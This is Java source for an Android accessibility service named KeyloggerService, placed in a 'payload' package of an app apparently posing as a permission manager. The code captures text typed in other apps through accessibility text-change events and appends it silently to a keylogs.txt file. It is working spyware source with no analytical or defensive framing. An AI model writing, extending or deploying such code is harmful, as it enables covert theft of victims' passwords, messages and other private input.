package com.example.permissionmanagerpro.payload;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

public class KeyloggerService extends AccessibilityService {
    private static final String TAG = "KeyloggerService";
    private static final String LOG_FILE = "keylogs.txt";

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            if (event.getSource() != null) {
                String text = event.getText().toString();
                if (!text.isEmpty()) {
                    saveLog(text);
                }
            }
        }
    }

    private void saveLog(String text) {
        try {
            File file = new File(getExternalFilesDir(null), LOG_FILE);
            FileWriter fw = new FileWriter(file, true);
            fw.append(text).append("\n");
            fw.flush();
            fw.close();
        } catch (IOException e) { e.printStackTrace(); }
    }

    @Override
    public void onInterrupt() { Log.d(TAG, "Interrupted"); }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        setServiceInfo(info);
        Log.d(TAG, "Keylogger Service Connected");
    }
}